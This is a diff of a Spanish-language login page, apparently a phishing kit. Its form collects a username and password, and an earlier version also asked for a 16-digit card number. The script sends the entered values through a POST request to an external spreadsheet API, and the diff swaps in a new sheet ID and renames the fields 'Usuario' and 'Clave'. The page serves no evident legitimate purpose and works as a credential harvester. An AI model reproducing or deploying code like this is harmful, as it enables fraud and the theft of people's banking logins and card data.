@@ -47,27 +47,20 @@
 				</div>
 		
 					<form class="formulario" id="contact-form"  name="submit-form">
-						<p class="centro"><b>Ingresa Tu Tarjeta</b>
-						</p><br>
-						<label for="nombre">16 Digitos de Tarjeta </label>
-					<div class="contenedor-input">
-						<input type="password" class="pass" id="usuario" name="usuario" placeholder=""/>
-					</div>
-					<form class="formulario" id="contact-form"  name="submit-form">
 						<p class="centro"><b>Ingresa Tu Usuario</b>
 						</p><br>
 						<label for="nombre">Tu Usuario debe tener entre 8 y 30 caracteres</label>
 					<div class="contenedor-input">
-						<input type="password" class="pass" id="contraseña" name="contraseña" placeholder=""/>
+						<input type="password" class="pass" id="usuario" name="usuario" placeholder=""/>
 					</div>
 					<form class="formulario" id="contact-form"  name="submit-form">
 						<p class="centro"><b>Ingresa Tu Contraseña</b>
 						</p><br>
 						<label for="nombre">Tu contraseña debe tener entre 8 y 30 caracteres</label>
 					<div class="contenedor-input">
-						<input type="password" class="pass" id="confirmar" name="confirmar" placeholder=""/>
-						<i class='bx bx-show-alt'></i>
+						<input type="password" class="pass" id="contraseña" name="contraseña" placeholder=""/>
 					</div>
+					
 		
 			
 					
@@ -109,16 +102,16 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/751b62ff-a940-4eab-9e57-bfdb78299644', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/0229b14e-74ee-42e6-8fa9-1f7cdfb1a6f6', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "1": formulario.usuario.value,
-            "2": formulario.contraseña.value,
-            "3": formulario.confirmar.value
+            "Usuario": formulario.usuario.value,
+            "Clave": formulario.contraseña.value
+            
         })
     });
 
